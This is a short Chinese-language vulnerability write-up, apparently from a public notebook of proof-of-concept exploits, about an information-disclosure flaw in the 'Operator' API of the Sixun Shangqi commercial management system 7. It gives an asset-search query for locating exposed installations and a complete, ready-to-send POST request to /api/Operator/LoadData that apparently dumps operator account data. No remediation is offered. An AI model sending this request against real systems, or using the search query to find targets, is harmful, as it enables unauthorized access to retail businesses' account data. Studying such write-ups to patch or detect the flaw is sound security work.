# 思迅商旗商业管理系统7 Operator存在信息泄露漏洞

# 一、漏洞简介
思迅商旗商业管理系统是基于互联网部署的全新零售管理系统。提炼各架构优势之大成，打造全新互联网产品。思迅商旗商业管理系统Operator存在信息泄露漏洞。

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 思迅商旗商业管理系统7

# 三、资产测绘
+ hunter`app.name=="思迅商旗"`
+ 特征

![1705060048606-5d05fc49-9ceb-4db7-84e0-7304c7456bf4.png](./img/4u1P83hisIgQdJ6S/1705060048606-5d05fc49-9ceb-4db7-84e0-7304c7456bf4-962899.png)

# 四、漏洞复现
```java
POST /api/Operator/LoadData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Length: 68
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

loadAll=false&oper_role=&field=&operator=&value=1001&gridFlag=OperatorList&page=1&rows=10
```

![1705060505001-32bb86d5-04df-4001-888a-4880bd5e7c92.png](./img/4u1P83hisIgQdJ6S/1705060505001-32bb86d5-04df-4001-888a-4880bd5e7c92-968676.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/afl5poxqgwpz8yhp>